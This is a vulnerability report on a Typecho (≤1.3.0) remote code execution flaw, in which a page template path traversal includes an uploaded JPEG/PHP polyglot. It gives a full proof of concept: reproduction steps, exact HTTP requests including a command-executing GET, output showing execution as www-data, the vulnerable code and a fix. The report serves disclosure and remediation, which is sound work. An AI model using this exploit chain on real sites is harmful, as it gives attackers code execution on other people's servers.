### Vulnerability details

**Official website / Product:** https://typecho.org

**Repository:** typecho/typecho (stars at selection: 12458)

**Vulnerability type:** RCE / getshell (page template path traversal → local file include)

**Vulnerability versions:** Typecho ≤ 1.3.0 (latest stable). Fixed in unreleased `v1.3.1-rc` (`isValidTemplate`).

**Vulnerability URL / Parameter:** `POST /index.php/action/contents-page-edit` parameter `template` (also XML-RPC `wp.newPage` / `wp.editPage` → `wp_page_template`); trigger `GET /index.php/<page-slug>.html`

**Complex:** yes

### Verification procedure

1. Deploy Typecho v1.3.0 (Docker php:7.4-apache + SQLite lab on port 18102).
2. Log in as a user with **editor** (or higher) privileges.
3. Upload a JPEG that appends PHP after a valid JFIF trailer (default `attachmentTypes` includes images).
4. Create/publish a page whose `template` is a relative traversal to that upload, e.g. `../../uploads/2026/11/<hash>.jpg`.
5. Visit the published page URL (no auth). PHP inside the JPEG is executed via `require_once`.

Vulnerability HTTP request:

```http
POST /index.php/action/contents-page-edit?_=<csrf> HTTP/1.1
Host: 127.0.0.1:18102
Referer: http://127.0.0.1:18102/admin/write-page.php
Cookie: <editor session>
Content-Type: application/x-www-form-urlencoded

title=LFI-RCE-PoC&text=x&template=../../uploads/2026/11/3336799053.jpg&do=publish&visibility=publish&slug=lfi-rce-poc

GET /index.php/lfi-rce-poc.html?c=id HTTP/1.1
Host: 127.0.0.1:18102
```

Verification result:

Unauthenticated page view returned `RCE_OK_Linux ...` and `uid=33(www-data) gid=33(www-data)`, proving code execution as the web server user. Evidence: `evidence/VULN-0001/exploit.out`.

### Vulnerability analysis

`Widget\Contents\Page\Edit::writePage()` takes `template` from the request without allowlisting against `getTemplates()`. The value is stored in `table.contents.template`.

When the page is rendered, `Widget\Archive` sets `$this->themeFile = $this->template` if non-empty, then:

`require_once $this->themeDir . $this->themeFile;`

after only a `file_exists` check. Path traversal escapes `usr/themes/<theme>/` into `usr/uploads/...`. Because `require` executes PHP regardless of extension, a default-allowed image polyglot yields RCE. Editor (not only administrator) can perform both upload and page write; theme editor is not required.

Vulnerable trigger / sink source (complete path and line numbers):

```php
# File: var/Widget/Contents/Page/Edit.php
# Lines: 47-58 (v1.3.0)
public function writePage()
{
    $contents = $this->request->from(
        'text',
        'template',
        'allowComment',
        'allowPing',
        'allowFeed',
        'slug',
        'order',
        'visibility'
    );
```

```php
# File: var/Widget/Archive.php
# Lines: 1679-1682, 1390 (v1.3.0)
if ($this->template) {
    /** 应用自定义模板 */
    $this->themeFile = $this->template;
}
// ...
require_once $this->themeDir . $this->themeFile;
```

### Vulnerability Fix

Allowlist templates with `isValidTemplate()` / `getTemplates()` on write and again before `require` (as done in commit `195b4e5` on `v1.3.1-rc`). Prefer `realpath` containment under the theme directory. Do not trust client-supplied template paths.
